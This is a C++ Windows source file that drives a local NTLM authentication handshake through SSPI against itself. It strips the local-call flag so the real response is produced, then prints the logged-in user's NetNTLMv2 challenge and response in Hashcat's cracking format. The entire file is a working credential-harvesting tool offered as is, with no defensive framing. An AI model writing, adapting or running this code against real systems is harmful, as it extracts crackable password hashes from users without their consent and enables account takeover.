// GetNTLMChallenge.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#define SECURITY_WIN32
#include <Security.h>
#include <Wincrypt.h>

#pragma comment(lib,"Secur32")

#define MSV1_0_CHALLENGE_LENGTH 8

// important for memory alignement !!!!!!!!!!!!!!!
// we align the data to be the exact representation of the struct.
// however, if the alignment is not back to default,
// you will have a surprise when using struct to systemcall
// ex: using UNICODE_STRING
// the pack is retablished before the end of this file
#pragma pack(push,1)


typedef enum {
	NtLmNegotiate = 1,
	NtLmChallenge,
	NtLmAuthenticate,
	NtLmUnknown
} NTLM_MESSAGE_TYPE;

typedef struct _STRING32 {
	USHORT Length;
	USHORT MaximumLength;
	DWORD  Offset;
} STRING32, *PSTRING32;

//
// Valid values of NegotiateFlags
//

#define NTLMSSP_NEGOTIATE_UNICODE               0x00000001  // Text strings are in unicode
#define NTLMSSP_NEGOTIATE_OEM                   0x00000002  // Text strings are in OEM
#define NTLMSSP_REQUEST_TARGET                  0x00000004  // Server should return its authentication realm

#define NTLMSSP_NEGOTIATE_SIGN                  0x00000010  // Request signature capability
#define NTLMSSP_NEGOTIATE_SEAL                  0x00000020  // Request confidentiality
#define NTLMSSP_NEGOTIATE_DATAGRAM              0x00000040  // Use datagram style authentication
#define NTLMSSP_NEGOTIATE_LM_KEY                0x00000080  // Use LM session key for sign/seal

#define NTLMSSP_NEGOTIATE_NETWARE               0x00000100  // NetWare authentication
#define NTLMSSP_NEGOTIATE_NTLM                  0x00000200  // NTLM authentication
#define NTLMSSP_NEGOTIATE_NT_ONLY               0x00000400  // NT authentication only (no LM)
#define NTLMSSP_NEGOTIATE_NULL_SESSION          0x00000800  // NULL Sessions on NT 5.0 and beyand

#define NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED       0x1000  // Domain Name supplied on negotiate
#define NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED  0x2000  // Workstation Name supplied on negotiate
#define NTLMSSP_NEGOTIATE_LOCAL_CALL            0x00004000  // Indicates client/server are same machine
#define NTLMSSP_NEGOTIATE_ALWAYS_SIGN           0x00008000  // Sign for all security levels

//
// Valid target types returned by the server in Negotiate Flags
//

#define NTLMSSP_TARGET_TYPE_DOMAIN              0x00010000  // TargetName is a domain name
#define NTLMSSP_TARGET_TYPE_SERVER              0x00020000  // TargetName is a server name
#define NTLMSSP_TARGET_TYPE_SHARE               0x00040000  // TargetName is a share name
#define NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY   0x00080000  // NTLM2 authentication added for NT4-SP4

#define NTLMSSP_NEGOTIATE_IDENTIFY              0x00100000  // Create identify level token

//
// Valid requests for additional output buffers
//

#define NTLMSSP_REQUEST_ACCEPT_RESPONSE         0x00200000  // get back session key, LUID
#define NTLMSSP_REQUEST_NON_NT_SESSION_KEY      0x00400000  // request non-nt session key
#define NTLMSSP_NEGOTIATE_TARGET_INFO           0x00800000  // target info present in challenge message

#define NTLMSSP_NEGOTIATE_EXPORTED_CONTEXT      0x01000000  // It's an exported context
#define NTLMSSP_NEGOTIATE_VERSION               0x02000000  // add the version field

#define NTLMSSP_NEGOTIATE_128                   0x20000000  // negotiate 128 bit encryption
#define NTLMSSP_NEGOTIATE_KEY_EXCH              0x40000000  // exchange a key using key exchange key
#define NTLMSSP_NEGOTIATE_56                    0x80000000  // negotiate 56 bit encryption

// flags used in client space to control sign and seal; never appear on the wire
#define NTLMSSP_APP_SEQ                 0x0040  // Use application provided seq num

#define MsvAvEOL                  0x0000
#define MsvAvNbComputerName       0x0001
#define MsvAvNbDomainName         0x0002
#define MsvAvNbDnsComputerName    0x0003
#define MsvAvNbDnsDomainName      0x0004
#define MsvAvNbDnsTreeName        0x0005
#define MsvAvFlags                0x0006
#define MsvAvTimestamp            0x0007
#define MsvAvRestrictions         0x0008
#define MsvAvTargetName           0x0009
#define MsvAvChannelBindings      0x000A



typedef struct _NTLM_VERSION
{
	BYTE ProductMajorVersion;
	BYTE ProductMinorVersion;
	USHORT ProductBuild;
	BYTE reserved[3];
	BYTE NTLMRevisionCurrent;
} NTLM_VERSION, *PNTLM_VERSION;

typedef struct _LMv1_RESPONSE
{
	BYTE Response[24];
} LMv1_RESPONSE, *PLMv1_RESPONSE;

typedef struct _LMv2_RESPONSE
{
	BYTE Response[16];
	BYTE ChallengeFromClient[8];
} LMv2_RESPONSE, *PLMv2_RESPONSE;

typedef struct _NTLMv1_RESPONSE
{
	BYTE Response[24];
} NTLMv1_RESPONSE, *PNTLMv1_RESPONSE;

typedef struct _NTLMv2_CLIENT_CHALLENGE
{
	BYTE RespType;
	BYTE HiRespType;
	USHORT Reserved1;
	DWORD Reserved2;
	ULONGLONG TimeStamp;
	BYTE ChallengeFromClient[8];
	DWORD Reserved3;
	BYTE AvPair[4];
} NTLMv2_CLIENT_CHALLENGE, *PNTLMv2_CLIENT_CHALLENGE;

typedef struct _NTLMv2_RESPONSE
{
	BYTE Response[16];
	NTLMv2_CLIENT_CHALLENGE Challenge;
} NTLMv2_RESPONSE, *PNTLMv2_RESPONSE;


//
// Opaque message returned from first call to InitializeSecurityContext
//

typedef struct _NEGOTIATE_MESSAGE {
	UCHAR Signature[8];
	DWORD MessageType;
	DWORD NegotiateFlags;
	STRING32 OemDomainName;
	STRING32 OemWorkstationName;
} NEGOTIATE_MESSAGE, *PNEGOTIATE_MESSAGE;

typedef struct _NEGOTIATE_MESSAGE_WITH_VERSION {
	UCHAR Signature[8];
	DWORD MessageType;
	DWORD NegotiateFlags;
	STRING32 OemDomainName;
	STRING32 OemWorkstationName;
	NTLM_VERSION Version;
} NEGOTIATE_MESSAGE_WITH_VERSION, *PNEGOTIATE_MESSAGE_WITH_VERSION;

//
// Opaque message returned from second call to InitializeSecurityContext
//
typedef struct _CHALLENGE_MESSAGE {
	UCHAR Signature[8];
	DWORD MessageType;
	STRING32 TargetName;
	DWORD NegotiateFlags;
	UCHAR Challenge[MSV1_0_CHALLENGE_LENGTH];
	ULONG64 ServerContextHandle;
	STRING32 TargetInfo;
} CHALLENGE_MESSAGE, *PCHALLENGE_MESSAGE;


typedef struct _CHALLENGE_MESSAGE_WITH_VERSION {
	UCHAR Signature[8];
	DWORD MessageType;
	STRING32 TargetName;
	DWORD NegotiateFlags;
	UCHAR Challenge[MSV1_0_CHALLENGE_LENGTH];
	ULONG64 ServerContextHandle;
	STRING32 TargetInfo;
	NTLM_VERSION Version;
} CHALLENGE_MESSAGE_WITH_VERSION, *PCHALLENGE_MESSAGE_WITH_VERSION;
//
// Non-opaque message returned from second call to AcceptSecurityContext
//
typedef struct _AUTHENTICATE_MESSAGE {
	UCHAR Signature[8];
	DWORD MessageType;
	STRING32 LmChallengeResponse;
	STRING32 NtChallengeResponse;
	STRING32 DomainName;
	STRING32 UserName;
	STRING32 Workstation;
	STRING32 SessionKey;
	DWORD NegotiateFlags;
} AUTHENTICATE_MESSAGE, *PAUTHENTICATE_MESSAGE;

// page 29 for oid msavrestrictions
typedef struct _RESTRICTIONS_ENCODING {
	DWORD dwSize;
	DWORD dwReserved;
	DWORD dwIntegrityLevel;
	DWORD dwSubjectIntegrityLevel;
	BYTE MachineId[32];
} RESTRICTIONS_ENCODING, *PRESTRICTIONS_ENCODING;

#pragma pack(pop)

// MD4 encryption of the password
typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


extern "C"
{
	// in advapi32.dll - no need to getprocaddress
	NTSTATUS WINAPI SystemFunction007(PUNICODE_STRING string, LPBYTE hash);
}

typedef struct _KEY_BLOB {
	BYTE   bType;
	BYTE   bVersion;
	WORD   reserved;
	ALG_ID aiKeyAlg;
	ULONG keysize;
	BYTE Data[16];
} KEY_BLOB;


//global var




BOOL GetNTLMChallengeAndResponse()
{
	WCHAR szDomainName[256 + 1] = L"";
	WCHAR szUserName[256 + 1] = L"";
	wchar_t ntlmsp_name[] = L"NTLM";
	UCHAR bServerChallenge[MSV1_0_CHALLENGE_LENGTH];
	PNTLMv2_RESPONSE pNtChallengeResponse = NULL;
	PNTLMv2_CLIENT_CHALLENGE pClientChallenge = NULL;
	DWORD dwClientChallengeSize = 0;

	CredHandle hInboundCred;
	CredHandle hOutboundCred;
	TimeStamp InboundLifetime;
	TimeStamp OutboundLifetime;

	DWORD status = AcquireCredentialsHandle(
		NULL,
		ntlmsp_name,
		SECPKG_CRED_OUTBOUND,
		NULL,
		NULL,
		NULL,
		NULL,
		&hOutboundCred,
		&OutboundLifetime);

	if (status != 0)
		return FALSE;

	status = AcquireCredentialsHandle(
		NULL,
		ntlmsp_name,
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		NULL,
		NULL,
		&hInboundCred,
		&InboundLifetime);

	if (status != 0)
		return FALSE;

	SecBufferDesc OutboundNegotiateBuffDesc;
	SecBuffer NegotiateSecBuff;
	OutboundNegotiateBuffDesc.ulVersion = 0;
	OutboundNegotiateBuffDesc.cBuffers = 1;
	OutboundNegotiateBuffDesc.pBuffers = &NegotiateSecBuff;

	NegotiateSecBuff.cbBuffer = 0;
	NegotiateSecBuff.BufferType = SECBUFFER_TOKEN;
	NegotiateSecBuff.pvBuffer = NULL;

	SecBufferDesc OutboundChallengeBuffDesc;
	SecBuffer ChallengeSecBuff;
	OutboundChallengeBuffDesc.ulVersion = 0;
	OutboundChallengeBuffDesc.cBuffers = 1;
	OutboundChallengeBuffDesc.pBuffers = &ChallengeSecBuff;

	ChallengeSecBuff.cbBuffer = 0;
	ChallengeSecBuff.BufferType = SECBUFFER_TOKEN;
	ChallengeSecBuff.pvBuffer = NULL;

	SecBufferDesc OutboundAuthenticateBuffDesc;
	SecBuffer AuthenticateSecBuff;
	OutboundAuthenticateBuffDesc.ulVersion = 0;
	OutboundAuthenticateBuffDesc.cBuffers = 1;
	OutboundAuthenticateBuffDesc.pBuffers = &AuthenticateSecBuff;

	AuthenticateSecBuff.cbBuffer = 0;
	AuthenticateSecBuff.BufferType = SECBUFFER_TOKEN;
	AuthenticateSecBuff.pvBuffer = NULL;



	CtxtHandle OutboundContextHandle = { 0 };
	ULONG OutboundContextAttributes = 0;
	CtxtHandle ClientContextHandle = { 0 };
	ULONG InboundContextAttributes = 0;

	// Setup the client security context
	status = InitializeSecurityContext(
		&hOutboundCred,
		NULL,                   // No Client context yet
		NULL,                   // Faked target name
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
		0,                      // Reserved 1
		SECURITY_NATIVE_DREP,
		NULL,				    // No initial input token
		0,                      // Reserved 2
		&OutboundContextHandle,
		&OutboundNegotiateBuffDesc,
		&OutboundContextAttributes,
		&OutboundLifetime);

	if (status != SEC_I_CONTINUE_NEEDED)
		return FALSE;

	NEGOTIATE_MESSAGE* negotiate = (NEGOTIATE_MESSAGE*)OutboundNegotiateBuffDesc.pBuffers[0].pvBuffer;

	//TraceNegotiateMessage((PBYTE) NegotiateBuffDesc.pBuffers[0].pvBuffer, NegotiateBuffDesc.pBuffers[0].cbBuffer);

	status = AcceptSecurityContext(
		&hInboundCred,
		NULL,               // No Server context yet
		&OutboundNegotiateBuffDesc,
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
		SECURITY_NATIVE_DREP,
		&ClientContextHandle,
		&OutboundChallengeBuffDesc,
		&InboundContextAttributes,
		&InboundLifetime);

	if (status != SEC_I_CONTINUE_NEEDED)
		return FALSE;

	// client
	CHALLENGE_MESSAGE* challenge = (CHALLENGE_MESSAGE*)OutboundChallengeBuffDesc.pBuffers[0].pvBuffer;


	// when local call, windows remove the ntlm response
	challenge->NegotiateFlags &= ~NTLMSSP_NEGOTIATE_LOCAL_CALL;

	status = InitializeSecurityContext(
		&hOutboundCred,
		&OutboundContextHandle,               // No Client context yet
		NULL,  // Faked target name
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
		0,                  // Reserved 1
		SECURITY_NATIVE_DREP,
		&OutboundChallengeBuffDesc,
		0,                  // Reserved 2
		&OutboundContextHandle,
		&OutboundAuthenticateBuffDesc,
		&OutboundContextAttributes,
		&OutboundLifetime);

	if (status != 0)
		return FALSE;

	AUTHENTICATE_MESSAGE* authenticate = (AUTHENTICATE_MESSAGE*)OutboundAuthenticateBuffDesc.pBuffers[0].pvBuffer;
	//TraceAuthenticateMessage((PBYTE) AuthenticateBuffDesc.pBuffers[0].pvBuffer, AuthenticateBuffDesc.pBuffers[0].cbBuffer);

	// Get domain name
	memcpy(szDomainName, ((PBYTE)authenticate + authenticate->DomainName.Offset), authenticate->DomainName.Length);
	szDomainName[authenticate->DomainName.Length / 2] = 0;

	// Get username
	memcpy(szUserName, ((PBYTE)authenticate + authenticate->UserName.Offset), authenticate->UserName.Length);
	szUserName[authenticate->UserName.Length / 2] = 0;

	// Get the Server challenge
	memcpy(bServerChallenge, challenge->Challenge, MSV1_0_CHALLENGE_LENGTH);


	// Get the Challenge response
	pNtChallengeResponse = (PNTLMv2_RESPONSE)((ULONG_PTR)authenticate + authenticate->NtChallengeResponse.Offset);

	pClientChallenge = &(pNtChallengeResponse->Challenge);
	dwClientChallengeSize = authenticate->NtChallengeResponse.Length - 16;


	// Hashcat Format: username:domain:ServerChallenge:response:blob
	// username:domain
	printf("%S::%S:", szUserName, szDomainName);

	// ServerChallenge
	for (int i = 0; i < sizeof(bServerChallenge); i++) {
		printf("%02x", bServerChallenge[i]);
	}
	printf(":");

	// response
	for (int i = 0; i < sizeof(pNtChallengeResponse->Response); i++) {
		printf("%02x", pNtChallengeResponse->Response[i]);
	}
	printf(":");

	// blob
	for (DWORD i = 0; i < dwClientChallengeSize; i++) {
		//printf("%02x", *(PBYTE)(((ULONG_PTR)authenticate + authenticate->NtChallengeResponse.Offset + 16 + i)));  // 16 
		printf("%02x", *((PBYTE)(&(pNtChallengeResponse->Challenge)) + i));  // 16 
	}
	printf("\n");

	return TRUE;
}

int main()
{
	if (!GetNTLMChallengeAndResponse())
	{
		printf("Unable to Get NTLM Challenge And Response\r\n");
	}

	return 0;
}